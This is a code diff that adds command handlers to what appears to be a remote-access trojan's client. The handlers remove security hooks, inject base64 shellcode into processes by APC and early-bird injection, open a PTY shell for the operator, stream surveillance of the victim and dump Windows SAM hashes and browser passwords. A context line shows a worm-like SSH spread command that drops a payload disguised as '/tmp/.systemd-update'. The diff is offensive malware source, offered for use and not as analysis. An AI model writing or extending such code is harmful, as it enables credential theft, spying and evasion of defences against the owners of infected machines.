@@ -203,3 +203,104 @@ class SSHSprdCommand(Command):
         payload = args[3] if len(args) > 3 else '/tmp/.systemd-update'
         ssh_spread(ctx.protocol, args[0], args[1], args[2], payload)
         return True
+
+
+class UnhookCommand(Command):
+    name = 'unhook'
+
+    def execute(self, ctx, raw: str):
+        from client.modules.stealth import unhook
+        result = unhook.restore_all()
+        ctx.protocol.send(result)
+        return True
+
+
+class SyscallInjectCommand(Command):
+    name = 'syscall_inject'
+
+    def execute(self, ctx, raw: str):
+        args = raw[15:].strip().split()
+        if len(args) < 2:
+            ctx.protocol.send('[-] Usage: syscall_inject <pid> <shellcode_b64>')
+            return True
+        import base64, os
+        if os.name != 'nt':
+            ctx.protocol.send('[-] Windows-only')
+            return True
+        from client.modules.stealth.injection_v2 import queue_user_apc
+        sc = base64.b64decode(args[1])
+        ctx.protocol.send(queue_user_apc(sc, int(args[0])))
+        return True
+
+
+class EarlyBirdCommand(Command):
+    name = 'early_bird'
+
+    def execute(self, ctx, raw: str):
+        args = raw[11:].strip().split()
+        if len(args) < 2:
+            ctx.protocol.send('[-] Usage: early_bird <target_exe> <shellcode_b64>')
+            return True
+        import base64, os
+        if os.name != 'nt':
+            ctx.protocol.send('[-] Windows-only')
+            return True
+        from client.modules.stealth.injection_v2 import early_bird_apc
+        sc = base64.b64decode(args[1])
+        ctx.protocol.send(early_bird_apc(sc, args[0]))
+        return True
+
+
+class PtieshCommand(Command):
+    name = 'pty'
+
+    def execute(self, ctx, raw: str):
+        from client.modules.shell_pty import start_pty_shell
+        ctx.protocol.send('[+] Starting PTY shell...')
+        start_pty_shell(ctx.protocol)
+        return True
+
+
+class StreamStartCommand(Command):
+    name = 'stream_start'
+
+    def execute(self, ctx, raw: str):
+        args = raw[13:].strip().split()
+        interval = int(args[0]) if args else 5
+        from client.modules.surveillance.stream import start_stream
+        ctx.protocol.send(start_stream(ctx.protocol, interval))
+        return True
+
+
+class StreamStopCommand(Command):
+    name = 'stream_stop'
+
+    def execute(self, ctx, raw: str):
+        from client.modules.surveillance.stream import stop_stream, stream_status
+        stop_stream()
+        ctx.protocol.send(stream_status())
+        return True
+
+
+class SamDumpCommand(Command):
+    name = 'sam_dump'
+
+    def execute(self, ctx, raw: str):
+        from client.modules.credentials.sam_dump import dump_sam
+        ctx.protocol.send(dump_sam(ctx.protocol))
+        return True
+
+
+class BrowserDumpV2Command(Command):
+    name = 'browser_dump'
+
+    def execute(self, ctx, raw: str):
+        from client.modules.credentials.browser_v2 import list_all_browsers, dump_firefox
+        results = ['=== Detected Browsers ===', list_all_browsers()]
+        try:
+            results.append('=== Firefox ===')
+            results.append(dump_firefox())
+        except Exception as e:
+            results.append(f'Firefox: {e}')
+        ctx.protocol.send('\n'.join(results))
+        return True
